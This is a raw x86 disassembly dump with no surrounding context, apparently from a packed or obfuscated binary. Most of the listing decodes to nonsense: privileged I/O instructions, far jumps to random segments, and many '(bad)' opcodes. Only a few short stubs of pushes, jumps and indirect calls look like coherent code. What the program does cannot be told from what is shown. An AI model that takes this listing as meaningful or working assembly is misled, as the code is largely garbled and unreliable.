  40401f:	mov    edi,DWORD PTR [edi+0x707357b1]
  404025:	daa    
  404026:	pushf  
  404027:	popa   
  404028:	and    DWORD PTR [edx+0x26],ebp
  40402b:	cli    
  40402c:	sbb    al,0xd0
  40402e:	add    al,0x6e
  404030:	dec    BYTE PTR [edx+0x4daa8622]
  404036:	xchg   edx,eax
  404037:	lock loop 0x404003
  40403a:	ret    
  40403b:	mov    edi,0x17aa6988
  404040:	js     0x4040a4
  404042:	push   ss
  404043:	sbb    edx,DWORD PTR [ebx+ebx*4]
  404046:	fwait
  404047:	pop    ecx
  404048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404049:	jmp    0x31f7:0x4454ecdc
  404050:	sbb    eax,0x3e3cb4e7
  404055:	inc    esp
  404056:	mov    fs,WORD PTR [esp+ecx*8-0x3]
  40405a:	cmp    BYTE PTR [ebx-0x31],dh
  40405d:	nop
  40405e:	sbb    eax,0xe985b203
  404063:	dec    ebp
  404064:	adc    BYTE PTR [ecx],0x6f
  404067:	pop    eax
  404068:	stc    
  404069:	stc    
  40406a:	imul   edi,DWORD PTR [eax],0x5e
  40406d:	loope  0x40407c
  40406f:	inc    eax
  404070:	xlat   BYTE PTR ds:[ebx]
  404071:	or     ebp,DWORD PTR [edi+0x37]
  404074:	xor    dh,bh
  404076:	dec    ebp
  404077:	sti    
  404078:	ss xchg ecx,eax
  40407a:	or     BYTE PTR [esi+eax*2+0x27],bl
  40407e:	cmc    
  40407f:	mov    al,0x8e
  404081:	iret   
  404082:	aad    0x8f
  404084:	test   al,0x57
  404086:	cmp    al,0xd9
  404088:	les    ebx,FWORD PTR [ecx+0x2f]
  40408b:	ins    DWORD PTR es:[edi],dx
  40408c:	test   BYTE PTR [ecx-0x3cec3e57],0xeb
  404093:	push   ebx
  404094:	mov    esi,DWORD PTR [ebx+0x2b]
  404097:	(bad)  
  404099:	mov    ds:0x51a25a9c,al
  40409e:	repz adc eax,0x767aaf50
  4040a4:	sahf   
  4040a5:	ror    BYTE PTR [edi-0x389f21e0],0xaf
  4040ac:	fimul  DWORD PTR [edx+edi*2-0x6b9c01d5]
  4040b3:	mov    WORD PTR [ebx+0x15ec2680],?
  4040b9:	mov    ebp,0xe21d4351
  4040be:	test   BYTE PTR [ebx-0x32d3b73e],bl
  4040c4:	jno    0x4040c8
  4040c6:	std    
  4040c7:	jns    0x404114
  4040c9:	mov    ebx,0x9f8303f7
  4040ce:	sub    dl,BYTE PTR [esi-0x17]
  4040d1:	imul   esi,DWORD PTR [esi],0x4c
  4040d4:	pop    esi
  4040d5:	mov    dl,0x55
  4040d7:	mov    DWORD PTR [ebx+0x66542043],eax
  4040dd:	sub    al,0x1f
  4040df:	addr16 pop ebx
  4040e1:	imul   eax,DWORD PTR [edx-0x281ba03a],0x2e57b06d
  4040eb:	test   BYTE PTR [edx-0x7],bh
  4040ee:	ret    
  4040ef:	add    eax,0xaf0985ef
  4040f4:	(bad)  
  4040f5:	out    dx,al
  4040f6:	push   cs
  4040f7:	inc    eax
  4040f8:	jbe    0x404165
  4040fa:	in     eax,0x4f
  4040fc:	lods   eax,DWORD PTR ds:[esi]
  4040fd:	jb     0x40413a
  4040ff:	adc    DWORD PTR [bx+si],edi
  404102:	retf   
  404103:	mov    bh,0x81
  404105:	scas   eax,DWORD PTR es:[edi]
  404106:	sub    ebp,DWORD PTR [ebx+0x69]
  404109:	out    0xe7,eax
  40410b:	lds    ecx,FWORD PTR [esi+esi*2+0x63db288b]
  404112:	add    al,0xd
  404114:	icebp  
  404115:	fsubr  QWORD PTR [eax-0x2f29f3b7]
  40411b:	dec    edx
  40411c:	sbb    DWORD PTR [ebp-0x3d],eax
  40411f:	adc    ah,BYTE PTR [eax-0x3a]
  404122:	sti    
  404123:	les    ecx,FWORD PTR [eax+eax*2-0x59]
  404127:	arpl   WORD PTR [edi],di
  404129:	xor    eax,0x2137cafe
  40412e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40412f:	sub    DWORD PTR [ebp-0x3d],ecx
  404132:	scas   al,BYTE PTR es:[edi]
  404133:	mov    eax,ds:0x3df8f65e
  404138:	data16 mov dl,0x46
  40413b:	mov    al,ds:0x654b54bf
  404140:	xchg   edi,eax
  404141:	cmp    BYTE PTR [edi-0x708136f],bh
  404147:	jmp    0x4040ce
  404149:	out    0xbd,eax
  40414b:	ficom  DWORD PTR [edx]
  40414d:	and    al,0x5
  40414f:	xlat   BYTE PTR ds:[ebx]
  404150:	lods   eax,DWORD PTR ds:[esi]
  404151:	ror    BYTE PTR [ebx+0x5cb045e0],1
  404157:	data16 jmp 0x404167
  40415a:	mov    bl,0x21
  40415c:	test   DWORD PTR [edi-0x69],ebp
  40415f:	or     eax,0x773ee483
  404164:	xchg   ebp,eax
  404165:	sbb    eax,0xc05d4411
  40416a:	push   esi
  40416b:	fs pop edx
  40416d:	jl     0x4041a4
  40416f:	mov    ds:0x598255ae,eax
  404174:	aaa    
  404175:	retf   0x8af4
  404178:	inc    edx
  404179:	nop
  40417a:	pop    ebx
  40417b:	mov    eax,0xea53d305
  404180:	arpl   WORD PTR [edi+0x7b061e45],bx
  404186:	sbb    DWORD PTR [esi+0x6c],0xa56c2378
  40418d:	dec    esp
  40418e:	push   0xfa65cf7e
  404193:	loopne 0x404211
  404195:	push   cs
  404196:	out    0xdf,al
  404198:	pop    esp
  404199:	jbe    0x4041a5
  40419b:	mov    bh,0xe8
  40419d:	or     al,0x88
  40419f:	push   esp
  4041a0:	inc    eax
  4041a1:	ss pop ebx
  4041a3:	std    
  4041a4:	mov    al,0x2d
  4041a6:	das    
  4041a7:	xchg   edi,eax
  4041a8:	xor    DWORD PTR [esi],ecx
  4041aa:	mov    ds:0xb95a3eb8,eax
  4041af:	xchg   DWORD PTR [ecx],esp
  4041b1:	loop   0x4041d2
  4041b3:	mov    bh,0x9e
  4041b5:	xor    al,BYTE PTR [esi+edi*1-0x26]
  4041b9:	jns    0x404200
  4041bb:	addr16 add eax,0x94728c57
  4041c1:	mov    BYTE PTR ds:0x2e71747a,ch
  4041c7:	test   DWORD PTR [eax],ebx
  4041c9:	inc    esi
  4041ca:	or     BYTE PTR [esi],bl
  4041cc:	jmp    0x130b:0x276b9c87
  4041d3:	shl    BYTE PTR [edi+0x6d1175],cl
  4041d9:	jo     0x404166
  4041db:	out    0x6d,eax
  4041dd:	add    al,0x8d
  4041df:	int    0xf4
  4041e1:	jle    0x404218
  4041e3:	ss retf 
  4041e5:	or     al,BYTE PTR [ebx+0x6]
  4041e8:	sahf   
  4041e9:	adc    esp,eax
  4041eb:	mov    al,ds:0x59fb8d86
  4041f0:	jne    0x404248
  4041f2:	push   ebx
  4041f3:	(bad)  
  4041f4:	(bad)
  4041f8:	pop    esp
  4041f9:	inc    ecx
  4041fa:	adc    al,0xd9
  4041fc:	bound  esp,QWORD PTR [ebp+0x53]
  4041ff:	sbb    BYTE PTR [esi+ebp*4-0x18b132aa],ah
  404206:	pop    ebp
  404207:	push   es
  404208:	sub    esp,DWORD PTR [eax+esi*4+0x49c9feb0]
  40420f:	xchg   ecx,edx
  404211:	dec    BYTE PTR [edx]
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si-0x29],0xfffffff2
  404248:	add    eax,0x7e25d5e9
  40424d:	jle    0x4042be
  40424f:	jge    0x4042cf
  404251:	jle    0x404206
  404253:	into   
  404254:	mov    dh,0x22
  404256:	sahf   
  404257:	scas   eax,DWORD PTR es:[edi]
  404258:	fwait
  404259:	loope  0x40420d
  40425b:	adc    DWORD PTR [esi-0x4fb9900],esi
  404261:	fwait
  404262:	add    dl,BYTE PTR [ebp+0x7e2b3678]
  404268:	adc    al,0x80
  40426a:	iret   
  40426b:	xor    BYTE PTR [ebx+0x5b],ah
  40426e:	xchg   esi,eax
  40426f:	mov    bl,0x51
  404271:	stos   BYTE PTR es:[edi],al
  404272:	mov    dh,BYTE PTR [edi+0x73e3fd3]
  404278:	scas   al,BYTE PTR es:[edi]
  404279:	push   ebx
  40427a:	or     al,0xb2
  40427c:	mov    ss,WORD PTR [ebp+0x4a]
  40427f:	sub    DWORD PTR [ebp+0x66381875],0x4d1d556d
  404289:	push   esp
  40428a:	mov    edi,0xe7d1a085
  40428f:	pushf  
  404290:	imul   edi,DWORD PTR [esi],0x9ab4c300
  404296:	loop   0x40427e
  404298:	add    al,0x9a
  40429a:	mov    ch,0xfe
  40429c:	test   eax,0xf1b315c7
  4042a1:	aad    0x86
  4042a3:	jo     0x4042e3
  4042a5:	call   0x15e7:0x3708fc9e
  4042ac:	xor    al,0x78
  4042ae:	cli    
  4042af:	pop    edi
  4042b0:	adc    dh,bl
  4042b2:	and    al,BYTE PTR [ecx+0x61809bca]
  4042b8:	ss call 0xc95f:0x8d0ba06e
  4042c0:	add    eax,0xb18925df
  4042c5:	out    dx,al
  4042c6:	sti    
  4042c7:	pop    ebx
  4042c8:	popf   
  4042c9:	or     al,0x39
  4042cb:	fimul  WORD PTR [ebx+0x21a93e61]
  4042d1:	mov    ds:0xda3529b1,eax
  4042d6:	add    BYTE PTR [ecx+0x46],cl
  4042d9:	mov    cl,0xf1
  4042db:	inc    ebx
  4042dc:	dec    esp
  4042dd:	xor    ebp,DWORD PTR [ecx]
  4042df:	jl     0x40426f
  4042e1:	push   eax
  4042e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042e3:	jmp    0x5c66a5e2
  4042e8:	push   edx
  4042e9:	push   ss
  4042ea:	mov    al,0xc6
  4042ec:	jecxz  0x40435c
  4042ee:	out    0xd2,eax
  4042f0:	jnp    0x40430e
  4042f2:	push   ebp
  4042f3:	xchg   edx,eax
  4042f4:	(bad)  
  4042f5:	(bad)  
  4042f7:	(bad)  [edx+0x36]
  4042fa:	pop    ecx
  4042fb:	test   eax,0xa68a72fb
  404301:	imul   DWORD PTR [eax+0x55]
  404304:	shl    bh,1
  404306:	pop    edx
  404307:	jmp    0xe15108f5
  40430c:	mov    bl,cl
  40430e:	fsubr  DWORD PTR [eax-0x7d785a84]
  404314:	(bad)  
  404315:	pusha  
  404316:	out    dx,eax
  404317:	or     ecx,DWORD PTR [esi-0x20]
  40431a:	inc    eax
  40431b:	cli    
  40431c:	jge    0x40438f
  40431e:	dec    ebx
  40431f:	inc    esi
  404320:	lea    esi,[ebx-0x5d7678ac]
  404326:	in     eax,0x4
  404328:	mov    esp,0x2acaec0a
  40432d:	sub    eax,0x18eec929
  404332:	sub    DWORD PTR [ebx-0x34],ebx
  404335:	call   0xef9845d1
  40433a:	pop    esp
  40433b:	mov    al,BYTE PTR [esi+0x3ebe5d40]
  404341:	sub    DWORD PTR [edx+0x53],eax
  404344:	or     dl,BYTE PTR [esi+ecx*4-0x61eaba5e]
  40434b:	or     eax,0x4877f408
  404350:	mov    ebx,0xcbf1b158
  404355:	inc    ebx
  404356:	mov    ah,0xd0
  404358:	jl     0x404347
  40435a:	hlt    
  40435b:	push   eax
  40435c:	add    bh,al
  40435e:	ret    0xcd20
  404361:	clc    
  404362:	hlt    
  404363:	mov    esp,0xb6806fdd
  404368:	mov    bh,0x90
  40436a:	xlat   BYTE PTR ds:[ebx]
  40436b:	pop    edi
  40436c:	add    BYTE PTR [edi-0x43],ch
  40436f:	and    DWORD PTR [ebx+0x51ac87e3],0x22
  404376:	(bad)  
  404377:	cmp    BYTE PTR [edx],0x42
  40437a:	pop    edi
  40437b:	out    0x16,al
  40437d:	xor    cl,cl
  40437f:	jb     0x404384
  404381:	push   0x328d48d0
  404386:	std    
  404387:	push   ebx
  404388:	mov    ebx,0x8ad8579b
  40438d:	mov    es,WORD PTR [ebx]
  40438f:	inc    edi
  404390:	mov    ds:0xb99d04e6,al
  404395:	push   edi
  404396:	lds    ebp,FWORD PTR [esi+0x68c30265]
  40439c:	mov    ds,WORD PTR [edi-0x57]
  40439f:	inc    ecx
  4043a0:	sbb    edx,DWORD PTR [ecx]
  4043a2:	jno    0x404370
  4043a4:	mov    ch,0x9a
  4043a6:	dec    esp
  4043a7:	jo     0x4043b3
  4043a9:	cmp    eax,0x4b5ee33c
  4043ae:	ss add eax,0x1646d731
  4043b4:	arpl   WORD PTR [eax+0x5b],bx
  4043b7:	add    DWORD PTR [eax],eax
  4043b9:	sahf   
  4043ba:	and    al,0x48
  4043bc:	xchg   ebp,eax
  4043bd:	add    al,0x5b
  4043bf:	out    0x66,al
  4043c1:	ins    BYTE PTR es:[edi],dx
  4043c2:	jbe    0x4043bd
  4043c4:	mov    WORD PTR [ecx-0x53f94d],cs
  4043ca:	shl    BYTE PTR [edi+0x56a72881],0x78
  4043d1:	jl     0x4043d8
  4043d3:	in     eax,dx
  4043d4:	mov    dh,0xd7
  4043d6:	mov    eax,0xf322ea79
  4043db:	push   ds
  4043dc:	outs   dx,DWORD PTR ds:[esi]
  4043dd:	std    
  4043de:	inc    eax
  4043df:	ins    BYTE PTR es:[edi],dx
  4043e0:	mov    dl,0xd5
  4043e2:	in     eax,0x86
  4043e4:	xchg   ebx,eax
  4043e5:	sub    DWORD PTR [ebx+eiz*4+0x48],0xffffff8d
  4043ea:	adc    BYTE PTR [ecx-0x49],dl
  4043ed:	test   al,bh
  4043ef:	xor    eax,0x1108f6fa
  4043f4:	and    al,0x49
  4043f6:	retf   0xcc5d
  4043f9:	xlat   BYTE PTR ds:[ebx]
  4043fa:	inc    ebx
  4043fb:	mov    ?,WORD PTR [eax]
  4043fd:	inc    eax
  4043fe:	add    DWORD PTR [edx],ebx
  404400:	and    DWORD PTR [edx-0x6d],ebx
  404403:	fld    DWORD PTR [edi-0x5a81ede]
  404409:	jmp    0x40439b
  40440b:	ret    0xdad
  40440e:	mov    ss,WORD PTR [ebp-0x2b]
  404411:	enter  0x3e59,0x9a
  404415:	test   al,bh
  404417:	scas   al,BYTE PTR es:[edi]
  404418:	mov    esp,0x8dd0aa0a
  40441d:	pushf  
  40441e:	add    eax,0xbfa6759c
  404423:	mov    bl,0xea
  404425:	push   edx
  404426:	in     eax,dx
  404427:	ret    
  404428:	or     ebp,ebp
  40442a:	xchg   ebp,eax
  40442b:	jp     0x4043c5
  40442d:	push   edx
  40442e:	pushf  
  40442f:	add    DWORD PTR [edi+eax*8+0x2226f6df],eax
  404436:	add    eax,0x8df8a86e
  40443b:	xor    eax,0x2a884e2d
  404440:	dec    ebp
  404441:	sti    
  404442:	jne    0x404452
  404444:	mov    ebp,0x568daaf2
  404449:	lods   eax,DWORD PTR ds:[esi]
  40444a:	push   ds
  40444b:	jns    0x40449a
  40444d:	leave  
  40444e:	je     0x40444e
  404450:	cmp    al,0x3
  404452:	stc    
  404453:	mov    ebx,0xc2c7a527
  404458:	jle    0x4044c7
  40445a:	cmp    al,0x27
  40445c:	jbe    0x4044bd
  40445e:	sub    al,0x3e
  404460:	mov    eax,ds:0x59fcf170
  404465:	fsub   st,st(6)
  404467:	rol    dl,0x80
  40446a:	mov    edi,0xd6d24429
  40446f:	out    dx,eax
  404470:	mov    ?,WORD PTR [edx+eiz*4-0x69]
  404474:	inc    ebx
  404475:	out    0x23,al
  404477:	repz sbb al,BYTE PTR [eax]
  40447a:	sub    eax,0x61f1b2cc
  40447f:	loope  0x40441b
  404481:	jnp    0x40445e
  404483:	xor    eax,0x671529c9
  404488:	push   fs
  40448a:	cmp    DWORD PTR [esi+0xf],esp
  40448d:	or     eax,0xb8778515
  404492:	inc    esi
  404493:	int3   
  404494:	add    al,0x1a
  404496:	push   ebp
  404497:	mov    dh,0xb0
  404499:	clc    
  40449a:	gs loop 0x40449b
  40449d:	xor    ch,BYTE PTR [esi-0x1d]
  4044a0:	mov    ebx,0x25c6318
  4044a5:	mov    ebx,0xd6611929
  4044aa:	jbe    0x40447d
  4044ac:	push   esi
  4044ad:	jle    0x404502
  4044af:	sub    BYTE PTR [edi+0x1c],dl
  4044b2:	je     0x4044c8
  4044b4:	sub    BYTE PTR [ebp+0x44a3f373],0xd6
  4044bb:	push   ebx
  4044bc:	adc    al,0x88
  4044be:	mov    ebp,0x7157c9fa
  4044c3:	sbb    ah,BYTE PTR [esi+0x574f1aa]
  4044c9:	or     ebp,DWORD PTR [ecx]
  4044cb:	ror    BYTE PTR [ecx],0xb7
  4044ce:	or     DWORD PTR [edi+0x76],esp
  4044d1:	xchg   edi,eax
  4044d2:	cmp    BYTE PTR [edi+0x28],ch
  4044d5:	loope  0x40452b
  4044d7:	jns    0x404534
  4044d9:	popa   
  4044da:	mov    al,ds:0x8290792f
  4044df:	out    0xc6,eax
  4044e1:	pop    ds
  4044e2:	jmp    DWORD PTR [edx-0x773bbe76]
  4044e8:	arpl   WORD PTR [ebx],ax
  4044ea:	pop    esi
  4044eb:	(bad)  
  4044ec:	int    0x96
  4044ee:	cs inc ecx
  4044f0:	fmul   DWORD PTR [esi+0x6fbe50dc]
  4044f6:	neg    ecx
  4044f8:	or     BYTE PTR [esp+ebx*1-0x57bd98b4],0xef
  404500:	dec    edx
  404501:	pusha  
  404502:	inc    ecx
  404503:	pop    ss
  404504:	and    DWORD PTR [ebx],ebp
  404506:	push   ebp
  404507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404508:	fsubr  QWORD PTR [esi]
  40450a:	xlat   BYTE PTR ds:[ebx]
  40450b:	int3   
  40450c:	cmp    ch,ch
  40450e:	popa   
  40450f:	arpl   WORD PTR [esi+esi*4-0x1fed9b77],si
  404516:	out    dx,al
  404517:	push   ss
  404518:	sub    ebx,ebx
  40451a:	ret    0x979a
  40451d:	jecxz  0x40453c
  40451f:	xchg   ebp,eax
  404520:	aad    0x3f
  404522:	into   
  404523:	lea    ebx,[edi+ebp*4+0x1cf28ee8]
  40452a:	shl    DWORD PTR [ebp-0x63],1
  40452d:	mov    cl,0x47
  40452f:	push   eax
  404530:	repz aam 0x45
  404533:	pop    esp
  404534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404535:	aad    0xb4
  404537:	xlat   BYTE PTR ds:[ebx]
  404538:	sahf   
  404539:	cmp    edi,DWORD PTR [edi]
  40453b:	cmp    DWORD PTR [ecx],0x836b7a02
  404541:	ja     0x4045b6
  404543:	ja     0x4045a6
  404545:	adc    al,ah
  404547:	mov    esp,0xdb7bc6aa
  40454c:	and    esp,DWORD PTR [ecx]
  40454e:	jl     0x4044f4
  404550:	sub    al,0x21
  404552:	sbb    dh,BYTE PTR cs:[esi]
  404555:	ret    
  404556:	xor    esi,DWORD PTR [ecx-0x41]
  404559:	cmp    DWORD PTR [edi+0x200841b6],esp
  40455f:	lods   eax,DWORD PTR ds:[esi]
  404560:	icebp  
  404561:	scas   eax,DWORD PTR es:[edi]
  404562:	sub    eax,0x76ec0475
  404567:	pop    eax
  404568:	cdq    
  404569:	jnp    0x4045a3
  40456b:	das    
  40456c:	add    BYTE PTR [edi],0xe9
  40456f:	int3   
  404570:	loopne 0x40452c
  404572:	cs fwait
  404574:	fwait
  404575:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404577:	jmp    0x52fb9d42
  40457c:	out    0x0,al
  40457e:	fldenv [eax+0xd]
  404581:	mov    BYTE PTR [ecx+ebx*2-0x2d],ch
  404585:	push   0xa94729c
  40458a:	sub    bh,ch
  40458c:	outs   dx,BYTE PTR ds:[esi]
  40458d:	adc    esp,ebx
  40458f:	mov    edx,DWORD PTR [eax-0x4c0f3e7]
  404595:	sbb    eax,0x5d26db7b
  40459a:	push   0x1c
  40459c:	gs and edx,edx
  40459f:	jle    0x4045a0
  4045a1:	into   
  4045a2:	and    al,0xe9
  4045a4:	imul   ebp,DWORD PTR [ecx+0x4ad88d08],0x21c77722
  4045ae:	data16 repz repnz into 
  4045b2:	repz out 0xdc,al
  4045b5:	pop    eax
  4045b6:	test   DWORD PTR [esi-0x6d],edx
  4045b9:	lock lahf 
  4045bb:	add    ah,cl
  4045bd:	jmp    0x4045d5
  4045bf:	sub    dh,BYTE PTR [ebx+0x68582da0]
  4045c5:	pop    eax
  4045c6:	std    
  4045c7:	je     0x40460c
  4045c9:	repnz push ebx
  4045cb:	int    0x5e
  4045cd:	js     0x40454f
  4045cf:	xchg   ebx,eax
  4045d0:	ret    
  4045d1:	scas   al,BYTE PTR es:[edi]
  4045d2:	cmc    
  4045d3:	sti    
  4045d4:	div    esi
  4045d6:	add    DWORD PTR [eax+0x34],0xffffffc2
  4045da:	mov    ch,0x79
  4045dc:	mov    ?,ebx
  4045de:	push   0x64976324
  4045e3:	outs   dx,BYTE PTR ds:[esi]
  4045e4:	lock adc DWORD PTR [eax+0x56d7b0e4],edi
  4045eb:	mov    esp,0xf7fa3f2d
  4045f0:	dec    ebx
  4045f1:	nop
  4045f2:	les    ebx,FWORD PTR [eax-0x3d]
  4045f5:	daa    
  4045f6:	ret    
  4045f7:	fld    QWORD PTR [ecx+0x46]
  4045fa:	add    BYTE PTR [edi],dh
  4045fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045fd:	xchg   esp,eax
  4045fe:	mov    ch,0x5c
  404600:	fimul  WORD PTR [edx]
  404602:	mov    bl,0x73
  404604:	nop
  404605:	sti    
  404606:	in     al,dx
  404607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404608:	fisub  DWORD PTR [edi+0x47]
  40460b:	push   ss
  40460c:	adc    eax,0x51aea65e
  404611:	scas   al,BYTE PTR es:[edi]
  404612:	(bad)  
  404613:	shr    BYTE PTR [ebx+ebp*8+0x46],cl
  404617:	std    
  404618:	bound  eax,QWORD PTR [esi+0x35]
  40461b:	sti    
  40461c:	addr16 das 
  40461e:	rol    DWORD PTR ds:0xcd853af7,cl
  404624:	dec    ebp
  404625:	mov    eax,?
  404627:	test   BYTE PTR [ebx],dh
  404629:	or     eax,0xe7f9fa08
  40462e:	push   0x7afe374a
  404633:	jnp    0x40469a
  404635:	fild   WORD PTR [edx]
  404637:	cmp    eax,0xb9aa6b7b
  40463c:	shr    DWORD PTR [eax],cl
  40463e:	sahf   
  40463f:	call   0x8d30:0xff4a4500
  404646:	add    eax,0x413dc2
  40464b:	push   DWORD PTR [eax]
  40464d:	xchg   ebx,edx
  40464f:	inc    ebx
  404650:	inc    ebx
  404651:	push   ebx
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0x9da77ee3
  404675:	mov    edi,0x7e7e21c2
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	jge    0x4046fb
  40467d:	jle    0x4046d6
  40467f:	dec    edx
  404680:	mov    eax,0x49507f50
  404685:	and    eax,0x1dface74
  40468a:	popf   
  40468b:	sbb    BYTE PTR [eax+0x54],0x23
  40468f:	sub    ebp,edi
  404691:	pop    ds
  404692:	inc    ecx
  404693:	mov    ebx,0x6a3be1ad
  404698:	push   ecx
  404699:	mov    ah,0xd4
  40469b:	push   ecx
  40469c:	rcl    DWORD PTR [edi],0x5b
  40469f:	sbb    cl,bl
  4046a1:	push   ebp
  4046a2:	adc    eax,0x20da624e
  4046a7:	adc    BYTE PTR [esp+esi*2+0x21cac885],bh
  4046ae:	or     BYTE PTR [edx],ch
  4046b0:	(bad)  
  4046b1:	cmp    ecx,DWORD PTR [eax]
  4046b3:	loopne 0x4046cc
  4046b5:	cli    
  4046b6:	in     eax,dx
  4046b7:	lds    ebp,FWORD PTR [ebx-0x31]
  4046ba:	sahf   
  4046bb:	jl     0x404732
  4046bd:	ret    
  4046be:	sbb    edx,DWORD PTR [ebp-0x64e530d1]
  4046c4:	icebp  
  4046c5:	(bad)  
  4046c6:	push   ss
  4046c7:	sub    edx,DWORD PTR [ecx-0x1d]
  4046ca:	xchg   esp,eax
  4046cb:	and    al,BYTE PTR [edi]
  4046cd:	xor    eax,0x1cbae6da
  4046d2:	jnp    0x40470d
  4046d4:	imul   esi,DWORD PTR [edx+edx*8+0x6d],0xffffffe4
  4046d9:	fmul   DWORD PTR [edi]
  4046db:	add    DWORD PTR [edi-0x34dc83c8],ecx
  4046e1:	jp     0x40471d
  4046e3:	mov    DWORD PTR [ebx+0x6cb38f30],eax
  4046e9:	inc    esi
  4046ea:	xchg   ecx,edx
  4046ec:	loop   0x4046d1
  4046ee:	adc    dh,BYTE PTR [ecx+edx*4]
  4046f1:	(bad)  
  4046f2:	xchg   ebx,eax
  4046f3:	sub    al,0xd0
  4046f5:	adc    al,0x84
  4046f7:	ins    BYTE PTR es:[edi],dx
  4046f8:	or     cl,BYTE PTR [esi-0x5914ebe1]
  4046fe:	out    0x4f,eax
  404700:	(bad)  
  404702:	or     eax,DWORD PTR [edx+0x5a]
  404705:	js     0x40469c
  404707:	jmp    0x98638b20
  40470c:	idiv   BYTE PTR [ebx]
  40470e:	sbb    ecx,0xffffffc3
  404711:	(bad)  
  404712:	mov    al,0x3e
  404714:	shr    DWORD PTR [ebx-0x68dbbfd2],1
  40471a:	fcom   DWORD PTR [ecx+ebx*8-0x44]
  40471e:	xchg   BYTE PTR [ecx+0x48399e77],cl
  404724:	scas   al,BYTE PTR es:[edi]
  404725:	adc    BYTE PTR [edx+0x4d7ae173],dh
  40472b:	stos   BYTE PTR es:[edi],al
  40472c:	leave  
  40472d:	shl    DWORD PTR [ebp+ebx*4-0x6a73564a],1
  404734:	mov    bl,0x73
  404736:	add    bl,BYTE PTR [esi-0x250af0ff]
  40473c:	add    BYTE PTR [edx],ah
  40473e:	out    dx,eax
  40473f:	popa   
  404740:	iret   
  404741:	push   esp
  404742:	pop    ds
  404743:	shl    BYTE PTR [esi+0x8715b0a],cl
  404749:	mov    ecx,0x64c7964a
  40474e:	mov    al,0x9f
  404750:	mov    bh,BYTE PTR [edx+0x58]
  404753:	cdq    
  404754:	je     0x404740
  404756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404757:	out    dx,eax
  404758:	xchg   edx,eax
  404759:	add    al,0x89
  40475b:	inc    edi
  40475c:	sub    al,al
  40475e:	xor    eax,0x337e21b4
  404763:	in     eax,dx
  404764:	ret    
  404765:	test   eax,0x410006ff
  40476a:	lods   eax,DWORD PTR ds:[esi]
  40476b:	cmp    cl,dl
  40476d:	(bad)  
  40476e:	jae    0x4046f2
  404770:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404772:	test   DWORD PTR [ebx-0x19],ebx
  404775:	and    ebx,DWORD PTR [edx+0x6e]
  404778:	xchg   esp,eax
  404779:	cmp    eax,0x520d45cd
  40477e:	loopne 0x40476d
  404780:	pop    ecx
  404781:	jmp    FWORD PTR ds:0xa09bb839
  404787:	fs out 0xdb,eax
  40478a:	and    eax,0xe74193eb
  40478f:	jmp    0xbf64:0xae5276
  404796:	fmul   DWORD PTR [edi]
  404798:	stos   BYTE PTR es:[edi],al
  404799:	mov    ds:0xbfdb1a0e,al
  40479e:	cwde   
  40479f:	mov    esp,0xf921f3a3
  4047a4:	lahf   
  4047a5:	nop
  4047a6:	sub    BYTE PTR [eax-0xdcbac23],0x86
  4047ad:	pop    edx
  4047ae:	lods   al,BYTE PTR ds:[esi]
  4047af:	add    al,dh
  4047b1:	cmp    al,0x84
  4047b3:	ds mov cl,0x66
  4047b6:	in     al,dx
  4047b7:	lock adc ebx,esi
  4047ba:	pushw  ss
  4047bc:	imul   esi,DWORD PTR ds:0xa374bace,0x31660735
  4047c6:	mov    esi,0x5e5077f1
  4047cb:	xchg   BYTE PTR [edx-0x438708ec],al
  4047d1:	push   edi
  4047d2:	inc    esi
  4047d3:	dec    ecx
  4047d4:	lahf   
  4047d5:	adc    BYTE PTR [edi+0x18],al
  4047d8:	xor    eax,0x2055d729
  4047dd:	xchg   edi,eax
  4047de:	daa    
  4047df:	out    dx,eax
  4047e0:	ss dec ecx
  4047e2:	test   ebx,esi
  4047e4:	mov    eax,0x81eecbe4
  4047e9:	dec    ecx
  4047ea:	adc    esi,ebx
  4047ec:	mov    edx,DWORD PTR [esi-0x1a]
  4047ef:	pusha  
  4047f0:	mov    al,0x2c
  4047f2:	jmp    0x2c991214
  4047f7:	ins    BYTE PTR es:[edi],dx
  4047f8:	frstor ds:0xe780b4a3
  4047fe:	aaa    
  4047ff:	shr    DWORD PTR [ebp+0xc770eb7],cl
  404805:	jnp    0x4047bb
  404807:	xlat   BYTE PTR ds:[ebx]
  404808:	les    esp,FWORD PTR [edx+0x96f9746]
  40480e:	mov    cl,0x7a
  404810:	imul   ebp,esp,0x24
  404813:	call   0xfba3:0x6de73bc5
  40481a:	mov    eax,ds:0x9e0d7ad2
  40481f:	mov    ecx,DWORD PTR [ebx+0x7f]
  404822:	push   ecx
  404823:	push   ebx
  404824:	cmc    
  404825:	(bad)  
  404826:	(bad)  
  404828:	xchg   esi,eax
  404829:	aam    0xdd
  40482b:	jmp    0x40482a
  40482d:	add    BYTE PTR [eax],dl
  40482f:	es adc al,0xc1
  404832:	cs mov esi,0x8602130b
  404838:	mov    ds:0xe4c9c753,eax
  40483d:	in     eax,0x42
